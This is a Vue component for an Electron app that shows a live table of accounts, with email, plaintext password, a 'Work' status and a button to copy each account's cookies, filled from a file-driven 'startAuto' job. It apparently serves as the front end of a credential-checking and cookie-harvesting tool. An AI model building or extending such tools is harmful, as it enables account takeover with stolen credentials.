<template>
  <div class="">
        <font-awesome-icon icon="arrow-circle-left" size="lg" class="back" @click="this.$router.go(-1)" />
    <div class="container-fluid d-flex justify-content-center align-items-center" style="height:100vh; overflow:hidden;">
<div class="row d-flex align-items-center" style="overflow:hidden; width:100vw; height:90vh">
<h2 class="text-center">
      Live Update For Accounts
    </h2>
<table class="table table-bordered table-striped table-hover">
  <thead>
    <tr>
      <th class="text-center">#</th>
      <th class="text-center">Email</th>
      <th class="text-center">Pass</th>
      <th class="text-center">Status</th>
      <th class="text-center">Cookies</th>
    </tr>
  </thead>
  <tbody>
    <tr v-for="row in rows" :key="row">
      <td class="text-center">{{ row.Id }}</td>
      <td class="text-center">{{ row.user }}</td>
      <td class="text-center">{{ row.pass }}</td>
      <td class="text-center" :class="row.status == 'Work' ? 'work':'check'">{{ row.status }}</td>
      <td class="text-center copy" @click="copy(row.Id)"><font-awesome-icon class="icona" size="lg" icon="clipboard" /></td>
    </tr>
  </tbody>
</table>

</div> <!-- Inner row -->
</div> <!-- Outer container -->

  </div>
</template>

<script>
const script = require('@/script/activate')
const ipc = require("electron").ipcRenderer
export default {
  data(){
    return {
      rows:[],
    }
  },
  methods:{
    copy(id) {
      if (!navigator.clipboard){
    // use old commandExec() way
    } else{
        navigator.clipboard.writeText(this.rows[id - 1].cookie)
      }
    }
  },
  async created(){
    await ipc.sendSync('startAuto', this.$route.params.file);
    ipc.on('done',(event,arg) => {
      if(arg.Id == "") {
        return
      } else {
        this.rows.push(arg)
      }
    })
  }
}
</script>
<style scoped>

table {
  margin-top: -344px;
  
}
.back{
    position: absolute;
    top: 60px;
    bottom: 50px;
    width:35px;
    height:35px;
    cursor: pointer;
}
td,th {
  color:#ddd !important;
}

.icona  {
  cursor: pointer;
}

.work {
  background-color: #557C55;
  font-size: 18px;
}

.check {
  background-color: #FF5959;
  font-size: 18px;
}
</style>
